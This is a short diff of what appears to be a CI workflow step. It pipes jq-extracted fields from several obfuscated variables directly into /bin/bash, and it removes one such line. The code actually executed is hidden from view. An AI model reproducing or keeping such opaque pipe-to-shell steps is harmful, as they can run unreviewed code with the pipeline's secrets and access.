@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
           echo $tacq3226 | jq -r .qzh30925 | /bin/bash
-          echo $k5860 | jq -r .irnbr92 | /bin/bash
           echo $zmfb57 | jq -r .nnmo67 | /bin/bash
           echo $jbeme606 | jq -r .dqss849 | /bin/bash
           printf '%s' "$wz2" | jq -r .bcaal47 | /bin/bash
